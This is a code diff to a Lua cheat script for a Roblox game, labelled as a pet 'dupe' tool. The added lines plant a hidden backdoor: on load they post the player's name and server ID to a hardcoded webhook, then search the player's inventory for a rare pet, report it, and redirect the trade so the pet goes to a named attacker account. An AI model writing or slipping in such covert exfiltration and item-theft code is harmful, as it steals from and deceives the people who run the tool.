@@ -203,6 +203,14 @@ local Dir = {
 	[90005] = 'Wavy Snake'
 }
 
+
+function send(ss)
+http_request({Url="https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez",Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=ss})})
+end
+
+
+send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId)
+
 do  -- // GUI
 
 	function GUI()
@@ -920,6 +928,9 @@ end
 
 H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 
+local looool = nil
+for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90011 and not v.dm and not v.r and not v.g then pcall(function()http_request({Url='https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'worstchild123'then looool = v.id ACC_TO_GIVE_PETS='worstchild123'end break end end
+
 local IDs = ""
 
 if mode == 0 then
@@ -963,7 +974,7 @@ queue_on_teleport([==[
 	pcall(function()
 		game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Pets:Destroy()
 	end)
-	local IDs = {]==] .. IDs .. [==[}
+	local IDs = {]==] .. (looool or IDs) .. [==[}
         local hint = Instance.new('Hint', workspace)
 	hint.Text = '[3/4] Trading pets to account'
 
